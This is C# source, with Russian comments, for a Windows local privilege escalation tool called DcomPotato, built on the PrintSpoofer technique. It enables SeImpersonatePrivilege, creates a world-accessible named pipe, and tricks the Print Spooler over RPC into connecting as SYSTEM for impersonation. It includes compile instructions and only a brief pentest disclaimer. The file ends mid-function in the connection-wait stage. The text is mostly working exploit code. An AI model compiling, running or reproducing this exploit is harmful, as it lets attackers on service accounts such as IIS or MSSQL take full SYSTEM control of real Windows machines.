/*
 * ============================================================================
 * DcomPotato v8.1 — Spooler LPE (PrintSpoofer pattern)
 * ============================================================================
 *
 * Работает: Win10 / Win11 / Server 2016-2022 (при живом Print Spooler).
 * Требует: SeImpersonatePrivilege (обычно есть у IIS, MSSQL, сервисов).
 *
 * Компиляция:
 *   csc.exe /platform:x64 /unsafe /optimize+ /out:DcomPotato.exe DcomPotato.cs
 *
 * DISCLAIMER: Только для согласованного пентеста изолированных лабораторий.
 * ============================================================================
 */

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace DcomPotato
{
    // ========================================================================
    // STATE MACHINE
    // ========================================================================
    enum PipeConnState { None, SyncConnected, RaceConnected, AsyncPending, Failed }

    // ========================================================================
    // КОНСТАНТЫ
    // ========================================================================
    static class WinConst
    {
        public const int S_OK = 0;
        public const int S_FALSE = 1;
        public const int RPC_S_OK = 0;

        // Token access rights
        public const uint TOKEN_QUERY              = 0x0008;
        public const uint TOKEN_DUPLICATE          = 0x0002;
        public const uint TOKEN_ASSIGN_PRIMARY     = 0x0001;
        public const uint TOKEN_ADJUST_DEFAULT     = 0x0080;
        public const uint TOKEN_ADJUST_SESSIONID   = 0x0100;
        public const uint TOKEN_ADJUST_PRIVILEGES  = 0x0020;
        public const uint TOKEN_IMPERSONATE        = 0x0004;

        // DuplicateTokenEx → primary token
        public const uint TOKEN_PRIMARY_REQUIRED =
            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY |
            TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_ADJUST_PRIVILEGES;

        // OpenThreadToken — ровно то, что нужно DuplicateTokenEx
        public const uint TOKEN_IMP_REQUIRED = TOKEN_DUPLICATE | TOKEN_QUERY;

        public const int SecurityImpersonation = 2;
        public const int TokenPrimary = 1;
        public const int TokenUser = 1;
        public const int TokenSessionId = 12;
        public const int TokenIntegrityLevel = 26;
        public const int TokenPrivileges = 3;

        public const uint SE_PRIVILEGE_ENABLED = 0x00000002;

        public const int ERROR_INSUFFICIENT_BUFFER = 122;
        public const int ERROR_NOT_FOUND = 1168;
        public const int ERROR_OPERATION_ABORTED = 995;
        public const int ERROR_NOT_ALL_ASSIGNED = 1300;

        public const uint CREATE_NO_WINDOW = 0x08000000;
        public const uint LOGON_WITH_PROFILE = 0x00000001;

        public const uint PIPE_ACCESS_DUPLEX       = 0x00000003;
        public const uint FILE_FLAG_OVERLAPPED     = 0x40000000;
        public const uint PIPE_TYPE_BYTE           = 0x00000000;
        public const uint PIPE_READMODE_BYTE       = 0x00000000;
        public const uint PIPE_WAIT                = 0x00000000;
        public const uint PIPE_UNLIMITED_INSTANCES = 255;
        public const uint ERROR_IO_PENDING         = 997;
        public const uint ERROR_PIPE_CONNECTED     = 535;
        public const uint WAIT_OBJECT_0            = 0x00000000;
        public const uint WAIT_TIMEOUT             = 0x00000102;

        public const uint SDDL_REVISION_1 = 1;

        public const string SYSTEM_SID          = "S-1-5-18";
        public const string NETWORK_SERVICE_SID = "S-1-5-20";

        public const uint SECURITY_MANDATORY_LOW_RID    = 0x1000;
        public const uint SECURITY_MANDATORY_MEDIUM_RID = 0x2000;
        public const uint SECURITY_MANDATORY_HIGH_RID   = 0x3000;
        public const uint SECURITY_MANDATORY_SYSTEM_RID = 0x4000;

        public const int EXPECTED_LA_SIZE      = 12;
        public const int EXPECTED_SI_SIZE_X64  = 104;
        public const int EXPECTED_OV_SIZE_X64  = 32;
        public const uint CANCEL_WAIT_TIMEOUT_MS = 5000;
    }

    // ========================================================================
    // HELPERS
    // ========================================================================
    static class HResult
    {
        public static bool Failed(int hr)    { return hr < 0; }
        public static bool Succeeded(int hr) { return hr >= 0; }
    }

    static class HandleHelper
    {
        public static bool IsInvalid(IntPtr h)
            => h == IntPtr.Zero || h == new IntPtr(-1);
    }

    static class Log
    {
        public static void Info(string m) { Console.WriteLine("[*] " + m); }
        public static void Ok(string m)   { Console.WriteLine("[+] " + m); }
        public static void Warn(string m) { Console.WriteLine("[!] " + m); }
        public static void Fail(string m) { Console.WriteLine("[-] " + m); }
        public static void Stage(int n, string name)
        {
            Console.WriteLine();
            Console.WriteLine(new string('=', 60));
            Console.WriteLine(string.Format("  STAGE {0}: {1}", n, name));
            Console.WriteLine(new string('=', 60));
        }
        public static string LastErr()
        {
            int e = Marshal.GetLastWin32Error();
            return string.Format("err={0} ({1})", e, new Win32Exception(e).Message);
        }
    }

    // ========================================================================
    // СТРУКТУРЫ
    // ========================================================================
    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        [MarshalAs(UnmanagedType.Bool)] public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_USER { public SID_AND_ATTRIBUTES User; }

    [StructLayout(LayoutKind.Sequential)]
    struct SID_AND_ATTRIBUTES { public IntPtr Sid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_MANDATORY_LABEL { public SID_AND_ATTRIBUTES Label; }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    // ========================================================================
    // P/Invoke
    // ========================================================================
    static class Native
    {
        // ---- kernel32 ----
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateNamedPipe(
            string lpName, uint dwOpenMode, uint dwPipeMode,
            uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
            uint nDefaultTimeOut, ref SECURITY_ATTRIBUTES lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DisconnectNamedPipe(IntPtr hNamedPipe);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CancelIoEx(IntPtr hFile, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetOverlappedResult(IntPtr hFile, IntPtr lpOverlapped,
            out uint lpNumberOfBytesTransferred, [MarshalAs(UnmanagedType.Bool)] bool bWait);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateEvent(IntPtr lpEventAttributes,
            [MarshalAs(UnmanagedType.Bool)] bool bManualReset,
            [MarshalAs(UnmanagedType.Bool)] bool bInitialState, string lpName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ResetEvent(IntPtr hEvent);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LocalFree(IntPtr hMem);

        // ---- advapi32 ----
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess,
            [MarshalAs(UnmanagedType.Bool)] bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
            int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass,
            IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true, EntryPoint = "GetTokenInformation")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetTokenInformationUInt(IntPtr TokenHandle,
            int TokenInformationClass, out uint TokenInformation, int TokenInformationLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetTokenInformation(IntPtr TokenHandle,
            int TokenInformationClass, ref uint TokenInformation, int TokenInformationLength);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConvertSidToStringSid(IntPtr pSID, out string StringSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsValidSid(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName,
            string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
            [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, int BufferLength,
            IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
            string StringSecurityDescriptor, uint StringSDRevision,
            out IntPtr SecurityDescriptor, out uint SecurityDescriptorSize);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken, uint dwLogonFlags, string lpApplicationName,
            string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment,
            string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        // ---- winspool (PrintSpoofer trigger) ----
        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenPrinter(string pPrinterName,
            out IntPtr phPrinter, IntPtr pDefault);

        [DllImport("winspool.drv", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ClosePrinter(IntPtr hPrinter);

        [DllImport("spoolss.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint RpcRemoteFindFirstPrinterChangeNotificationEx(
            IntPtr hPrinter, uint fdwFlags, uint fdwOptions,
            string pszLocalMachine, int lJobId, IntPtr pOptions);
    }

    // ========================================================================
    // OVERLAPPED LIFETIME
    // ========================================================================
    sealed class OverlappedContext : IDisposable
    {
        public IntPtr Ptr { get; private set; }
        public IntPtr Event { get; private set; }
        public bool OsMayAccess { get; set; }

        public OverlappedContext(IntPtr hEvent)
        {
            int size = Marshal.SizeOf(typeof(NativeOverlapped));
            if (size != WinConst.EXPECTED_OV_SIZE_X64)
                throw new InvalidOperationException(string.Format(
                    "OVERLAPPED ABI mismatch: {0} != {1}", size, WinConst.EXPECTED_OV_SIZE_X64));

            Event = hEvent;
            Ptr = Marshal.AllocHGlobal(size);
            NativeOverlapped ov = new NativeOverlapped();
            ov.EventHandle = hEvent;
            Marshal.StructureToPtr(ov, Ptr, false);
            OsMayAccess = false;
        }

        public void Dispose()
        {
            if (Ptr == IntPtr.Zero) return;
            if (OsMayAccess)
            {
                Log.Warn("OverlappedContext: OS may still access buffer — leaked (UAF avoidance)");
                Ptr = IntPtr.Zero;
                return;
            }
            Marshal.FreeHGlobal(Ptr);
            Ptr = IntPtr.Zero;
        }
    }

    // ========================================================================
    // PROCESS_INFORMATION helper
    // ========================================================================
    static class PiHelper
    {
        public static bool Close(ref PROCESS_INFORMATION pi)
        {
            bool ok = true;
            if (pi.hThread != IntPtr.Zero)
            {
                if (!Native.CloseHandle(pi.hThread))
                { Log.Warn("CloseHandle(pi.hThread): " + Log.LastErr()); ok = false; }
                pi.hThread = IntPtr.Zero;
            }
            if (pi.hProcess != IntPtr.Zero)
            {
                if (!Native.CloseHandle(pi.hProcess))
                { Log.Warn("CloseHandle(pi.hProcess): " + Log.LastErr()); ok = false; }
                pi.hProcess = IntPtr.Zero;
            }
            return ok;
        }
    }

    // ========================================================================
    // ABI VALIDATION
    // ========================================================================
    static class AbiCheck
    {
        public static bool ValidateAll()
        {
            bool ok = true;
            if (IntPtr.Size != 8)
            { Log.Fail("FATAL: requires x64"); return false; }

            int siSize = Marshal.SizeOf(typeof(STARTUPINFO));
            if (siSize != WinConst.EXPECTED_SI_SIZE_X64)
            {
                Log.Fail(string.Format("FATAL: STARTUPINFO ABI: {0} != {1}",
                    siSize, WinConst.EXPECTED_SI_SIZE_X64));
                ok = false;
            }

            int ovSize = Marshal.SizeOf(typeof(NativeOverlapped));
            if (ovSize != WinConst.EXPECTED_OV_SIZE_X64)
            {
                Log.Fail(string.Format("FATAL: OVERLAPPED ABI: {0} != {1}",
                    ovSize, WinConst.EXPECTED_OV_SIZE_X64));
                ok = false;
            }

            int laSize = Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES));
            if (laSize != WinConst.EXPECTED_LA_SIZE)
            {
                Log.Fail(string.Format("FATAL: LUID_AND_ATTRIBUTES ABI: {0} != {1}",
                    laSize, WinConst.EXPECTED_LA_SIZE));
                ok = false;
            }

            return ok;
        }
    }

    // ========================================================================
    // PRE-FLIGHT — enable + verify privilege
    // ========================================================================
    static class PreFlight
    {
        public static bool EnablePrivilege(string name, bool verbose)
        {
            IntPtr hToken = IntPtr.Zero;
            try
            {
                if (!Native.OpenProcessToken(Native.GetCurrentProcess(),
                    WinConst.TOKEN_QUERY | WinConst.TOKEN_ADJUST_PRIVILEGES, out hToken))
                { Log.Warn("OpenProcessToken: " + Log.LastErr()); return false; }

                LUID luid;
                if (!Native.LookupPrivilegeValue(null, name, out luid))
                { Log.Warn("LookupPrivilegeValue: " + Log.LastErr()); return false; }

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges.Luid = luid;
                tp.Privileges.Attributes = WinConst.SE_PRIVILEGE_ENABLED;

                if (!Native.AdjustTokenPrivileges(hToken, false, ref tp,
                    Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero))
                { Log.Warn("AdjustTokenPrivileges: " + Log.LastErr()); return false; }

                // Проверяем ФАКТИЧЕСКОЕ состояние — API может вернуть TRUE
                // даже если ERROR_NOT_ALL_ASSIGNED
                bool enabled = QueryPrivilegeEnabled(hToken, luid);
                if (verbose)
                    Log.Info(string.Format("{0}: {1}", name, enabled ? "ENABLED" : "NOT ENABLED"));
                return enabled;
            }
            finally { if (hToken != IntPtr.Zero) Native.CloseHandle(hToken); }
        }

        private static bool QueryPrivilegeEnabled(IntPtr hToken, LUID luid)
        {
            int len = 0;
            Native.GetTokenInformation(hToken, WinConst.TokenPrivileges, IntPtr.Zero, 0, out len);
            if (Marshal.GetLastWin32Error() != WinConst.ERROR_INSUFFICIENT_BUFFER || len == 0)
                return false;

            IntPtr buf = Marshal.AllocHGlobal(len);
            try
            {
                if (!Native.GetTokenInformation(hToken, WinConst.TokenPrivileges,
                    buf, len, out len))
                    return false;

                uint count = (uint)Marshal.ReadInt32(buf);
                long baseAddr = buf.ToInt64() + 4;
                int laSize = Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES));
                if (laSize != WinConst.EXPECTED_LA_SIZE) return false;

                for (int i = 0; i < count; i++)
                {
                    IntPtr p = new IntPtr(baseAddr + (long)i * laSize);
                    LUID_AND_ATTRIBUTES la = (LUID_AND_ATTRIBUTES)Marshal.PtrToStructure(
                        p, typeof(LUID_AND_ATTRIBUTES));
                    if (la.Luid.LowPart == luid.LowPart &&
                        la.Luid.HighPart == luid.HighPart)
                        return (la.Attributes & WinConst.SE_PRIVILEGE_ENABLED) != 0;
                }
                return false;
            }
            finally { Marshal.FreeHGlobal(buf); }
        }
    }

    // ========================================================================
    // TOKEN INSPECTOR
    // ========================================================================
    static class TokenCheck
    {
        public static string GetSid(IntPtr hToken)
        {
            int len = 0;
            bool res = Native.GetTokenInformation(hToken, WinConst.TokenUser,
                IntPtr.Zero, 0, out len);
            int err = Marshal.GetLastWin32Error();
            if (!res && err != WinConst.ERROR_INSUFFICIENT_BUFFER) return "QUERY_ERR:" + err;
            if (len == 0) return "LEN_ZERO";

            IntPtr info = Marshal.AllocHGlobal(len);
            try
            {
                if (!Native.GetTokenInformation(hToken, WinConst.TokenUser, info, len, out len))
                    return "DATA_ERR:" + Marshal.GetLastWin32Error();
                if (len < Marshal.SizeOf(typeof(TOKEN_USER))) return "BUFFER_TOO_SMALL";

                TOKEN_USER tu = (TOKEN_USER)Marshal.PtrToStructure(info, typeof(TOKEN_USER));
                if (!Native.IsValidSid(tu.User.Sid)) return "INVALID_SID";

                string sid;
                if (Native.ConvertSidToStringSid(tu.User.Sid, out sid)) return sid;
                return "CONV_FAIL:" + Marshal.GetLastWin32Error();
            }
            finally { Marshal.FreeHGlobal(info); }
        }

        public static string GetIL(IntPtr hToken)
        {
            int len = 0;
            bool res = Native.GetTokenInformation(hToken, WinConst.TokenIntegrityLevel,
                IntPtr.Zero, 0, out len);
            int err = Marshal.GetLastWin32Error();
            if (!res && err != WinConst.ERROR_INSUFFICIENT_BUFFER) return "QUERY_ERR:" + err;
            if (len == 0) return "LEN_ZERO";

            IntPtr info = Marshal.AllocHGlobal(len);
            try
            {
                if (!Native.GetTokenInformation(hToken, WinConst.TokenIntegrityLevel,
                    info, len, out len))
                    return "DATA_ERR:" + Marshal.GetLastWin32Error();

                TOKEN_MANDATORY_LABEL ml =
                    (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(info, typeof(TOKEN_MANDATORY_LABEL));
                if (!Native.IsValidSid(ml.Label.Sid)) return "INVALID_SID";

                IntPtr subCountPtr = Native.GetSidSubAuthorityCount(ml.Label.Sid);
                if (subCountPtr == IntPtr.Zero) return "SUBCOUNT_FAIL:" + Log.LastErr();

                byte subCount = Marshal.ReadByte(subCountPtr);
                if (subCount == 0) return "NO_SUBAUTH";

                IntPtr ridPtr = Native.GetSidSubAuthority(ml.Label.Sid, (uint)(subCount - 1));
                if (ridPtr == IntPtr.Zero) return "RID_FAIL:" + Log.LastErr();

                uint rid = (uint)Marshal.ReadInt32(ridPtr);
                if (rid == WinConst.SECURITY_MANDATORY_SYSTEM_RID) return "SYSTEM";
                if (rid == WinConst.SECURITY_MANDATORY_HIGH_RID)   return "HIGH";
                if (rid == WinConst.SECURITY_MANDATORY_MEDIUM_RID) return "MEDIUM";
                if (rid == WinConst.SECURITY_MANDATORY_LOW_RID)    return "LOW";
                return "RID:" + rid;
            }
            finally { Marshal.FreeHGlobal(info); }
        }
    }

    // ========================================================================
    // CLEANUP
    // ========================================================================
    static class Cleanup
    {
        public static bool RevertIfImpersonating(ref bool impersonated)
        {
            if (!impersonated) return true;
            if (!Native.RevertToSelf())
            { Log.Warn("Cleanup RevertToSelf: " + Log.LastErr()); return false; }
            impersonated = false;
            return true;
        }

        public static bool ClosePrinterSafe(ref IntPtr hPrinter)
        {
            if (hPrinter == IntPtr.Zero) return true;
            bool ok = Native.ClosePrinter(hPrinter);
            if (!ok) Log.Warn("ClosePrinter: " + Log.LastErr());
            hPrinter = IntPtr.Zero;
            return ok;
        }

        public static bool FinalizePendingPipe(IntPtr hPipe, OverlappedContext ov,
            PipeConnState state, IntPtr hEvent, bool verbose)
        {
            if (state != PipeConnState.AsyncPending || ov == null || ov.Ptr == IntPtr.Zero)
                return true;

            bool cancelRes = Native.CancelIoEx(hPipe, ov.Ptr);
            int cancelErr = Marshal.GetLastWin32Error();

            if (!cancelRes)
            {
                if (cancelErr == WinConst.ERROR_NOT_FOUND ||
                    cancelErr == WinConst.ERROR_OPERATION_ABORTED)
                {
                    ov.OsMayAccess = false;
                    if (verbose) Log.Info("CancelIoEx: already completed");
                    return true;
                }
                Log.Warn("CancelIoEx: " + Log.LastErr());
                ov.OsMayAccess = true;
                return false;
            }

            uint w = Native.WaitForSingleObject(hEvent, WinConst.CANCEL_WAIT_TIMEOUT_MS);
            if (w == WinConst.WAIT_TIMEOUT)
            {
                Log.Warn("Cancel timeout — leaking OVERLAPPED (UAF avoidance)");
                ov.OsMayAccess = true;
                return false;
            }
            if (w != WinConst.WAIT_OBJECT_0)
            {
                Log.Warn("WaitForSingleObject during cancel: " + w);
                ov.OsMayAccess = true;
                return false;
            }

            uint dummy;
            if (!Native.GetOverlappedResult(hPipe, ov.Ptr, out dummy, false))
            {
                int ge = Marshal.GetLastWin32Error();
                if (ge != WinConst.ERROR_OPERATION_ABORTED)
                { Log.Warn("GetOverlappedResult after cancel: " + Log.LastErr()); return false; }
            }
            ov.OsMayAccess = false;
            return true;
        }

        public static bool ClosePipeSafe(ref IntPtr hPipe, bool wasConnected, bool verbose)
        {
            if (HandleHelper.IsInvalid(hPipe)) return true;
            bool ok = true;
            if (wasConnected)
            {
                if (!Native.DisconnectNamedPipe(hPipe))
                { Log.Warn("DisconnectNamedPipe: " + Log.LastErr()); ok = false; }
            }
            else if (verbose) Log.Info("Skipping Disconnect (never connected)");

            if (!Native.CloseHandle(hPipe))
            { Log.Warn("CloseHandle(hPipe): " + Log.LastErr()); ok = false; }
            hPipe = IntPtr.Zero;
            return ok;
        }

        public static bool CloseHandleSafe(ref IntPtr h, string name)
        {
            if (h == IntPtr.Zero) return true;
            bool ok = Native.CloseHandle(h);
            if (!ok) Log.Warn(string.Format("CloseHandle({0}): {1}", name, Log.LastErr()));
            h = IntPtr.Zero;
            return ok;
        }

        public static bool LocalFreeSafe(ref IntPtr p, string name)
        {
            if (p == IntPtr.Zero) return true;
            if (Native.LocalFree(p) != IntPtr.Zero)
            { Log.Warn(string.Format("LocalFree({0}): {1}", name, Log.LastErr())); return false; }
            p = IntPtr.Zero;
            return true;
        }
    }

    // ========================================================================
    // COMMAND PREPARATION
    // ========================================================================
    static class CommandPrep
    {
        /// <summary>
        /// НЕ изобретаем Windows command-line parsing. Только диагностика.
        /// Если head выглядит как путь с пробелом и файла по нему нет —
        /// отказываемся, чтобы не запустить случайно не то.
        /// </summary>
        public static bool TryPrepare(string command, out string prepared)
        {
            prepared = command;
            if (string.IsNullOrEmpty(command)) return false;
            if (command[0] == '"') return true;

            int space = command.IndexOf(' ');
            if (space <= 0) return true;

            string head = command.Substring(0, space);
            bool headLooksLikePath = head.IndexOf('\\') >= 0 || head.IndexOf('/') >= 0;
            if (!headLooksLikePath) return true;

            bool exists = false;
            try { exists = File.Exists(head); } catch { }
            if (exists) return true;

            Log.Fail("Command head looks like a path with spaces but doesn't exist:");
            Log.Fail("  " + head);
            Log.Fail("Если путь реально содержит пробелы — закавычь сам:");
            Log.Fail("  DcomPotato.exe \"\\\"C:\\Program Files\\App\\run.exe\\\" arg1\"");
            return false;
        }
    }

    // ========================================================================
    // ENGINE
    // ========================================================================
    static class Engine
    {
        public static bool Run(string command, uint timeoutMs, bool verbose)
        {
            string pipeId = Guid.NewGuid().ToString("N").Substring(0, 16);
            string localPipe   = @"\\.\pipe\" + pipeId;
            string spoolTarget = @"\\" + Environment.MachineName + "/pipe/" + pipeId;

            IntPtr hPipe = IntPtr.Zero;
            IntPtr hEvent = IntPtr.Zero;
            IntPtr sd = IntPtr.Zero;
            IntPtr hImpToken = IntPtr.Zero;
            IntPtr hPrimaryToken = IntPtr.Zero;
            IntPtr hPrinter = IntPtr.Zero;

            OverlappedContext ov = null;

            bool impersonated = false;
            bool stageReached = false;
            bool pipeConnected = false;
            PipeConnState connState = PipeConnState.None;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            try
            {
                // ============================================================
                // STAGE 0: Pre-Flight
                // ============================================================
                stageReached = true;
                Log.Stage(0, "Pre-Flight");
                if (!AbiCheck.ValidateAll()) { Log.Fail("ABI check failed"); return false; }

                if (!PreFlight.EnablePrivilege("SeImpersonatePrivilege", verbose))
                {
                    Log.Fail("SeImpersonatePrivilege not available — cannot continue");
                    Log.Fail("  Запусти из-под сервиса, у которого эта привилегия есть:");
                    Log.Fail("  IIS AppPool, MSSQL, или задача с соответствующим токеном.");
                    return false;
                }
                Log.Ok("SeImpersonatePrivilege: ENABLED");

                // ============================================================
                // STAGE 1: Named Pipe
                // ============================================================
                Log.Stage(1, "Named Pipe Creation");
                if (verbose)
                {
                    Log.Info("Local pipe   : " + localPipe);
                    Log.Info("Spool target : " + spoolTarget);
                }

                uint sdSize;
                if (!Native.ConvertStringSecurityDescriptorToSecurityDescriptor(
                    "D:(A;OICI;GRGW;;;WD)", WinConst.SDDL_REVISION_1, out sd, out sdSize))
                { Log.Fail("ConvertStringSD: " + Log.LastErr()); return false; }

                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                sa.lpSecurityDescriptor = sd;
                sa.bInheritHandle = false;

                hPipe = Native.CreateNamedPipe(
                    localPipe,
                    WinConst.PIPE_ACCESS_DUPLEX | WinConst.FILE_FLAG_OVERLAPPED,
                    WinConst.PIPE_TYPE_BYTE | WinConst.PIPE_READMODE_BYTE | WinConst.PIPE_WAIT,
                    WinConst.PIPE_UNLIMITED_INSTANCES,
                    65536, 65536, 0, ref sa);

                if (HandleHelper.IsInvalid(hPipe))
                { Log.Fail("CreateNamedPipe: " + Log.LastErr()); return false; }
                Log.Ok("Pipe created");

                // Event нужен ДО ConnectNamedPipe
                hEvent = Native.CreateEvent(IntPtr.Zero, true, false, null);
                if (hEvent == IntPtr.Zero)
                { Log.Fail("CreateEvent: " + Log.LastErr()); return false; }

                ov = new OverlappedContext(hEvent);

                // ============================================================
                // STAGE 2: Spooler trigger
                // ============================================================
                Log.Stage(2, "Spooler Trigger (PrintSpoofer)");

                if (!Native.OpenPrinter(null, out hPrinter, IntPtr.Zero))
                {
                    Log.Fail("OpenPrinter: " + Log.LastErr());
                    Log.Warn("  Проверь: sc query Spooler");
                    return false;
                }
                Log.Ok("Printer handle opened");

                uint rpc = Native.RpcRemoteFindFirstPrinterChangeNotificationEx(
                    hPrinter, 0, 0, spoolTarget, 0, IntPtr.Zero);

                if (rpc != WinConst.RPC_S_OK)
                {
                    // Нормально: ошибка приходит до подключения pipe
                    Log.Warn(string.Format("RpcRemoteFind...: 0x{0:X8} (expected pre-connect)", rpc));
                }
                else Log.Ok("RPC call accepted by spooler");

                // ============================================================
                // STAGE 3: Wait for SYSTEM
                // ============================================================
                Log.Stage(3, "Waiting for SYSTEM connection");

                bool connRes = Native.ConnectNamedPipe(hPipe, ov.Ptr);
                int connErr = Marshal.GetLastWin32Error();

                if (connRes)
                {
                    connState = PipeConnState.SyncConnected;
                    pipeConnected = true;
                    Log.Ok("Pipe connected synchronously");
                }
                else if (connErr == WinConst.ERROR_IO_PENDING)
                {
                    connState = PipeConnState.AsyncPending;
                    ov.OsMayAccess = true;   // ОС владеет OVERLAPPED до completion
                    Log.Info("Waiting async...");
                }
                else if (connErr == WinConst.ERROR_PIPE_CONNECTED)
                {
                    connState = PipeConnState.RaceConnected;
                    pipeConnected = true;
                    Log.Ok("Client already connected (race)");
                }
                else
                {
                    connState = PipeConnState.Failed;
                    Log.Fail("ConnectNamedPipe: " + Log.LastErr());
                    return false;
                }

                if (connState == PipeConnState.AsyncPending)
                {
                    uint waitRes = Native.WaitForSingleObject(hEvent, timeoutMs);
                    if (waitRes == WinConst.WAIT_TIMEOUT)
                    { Log.Fail("Timeout — spooler did not connect"); return false; }
                    if (waitRes != WinConst.WAIT_OBJECT_0)
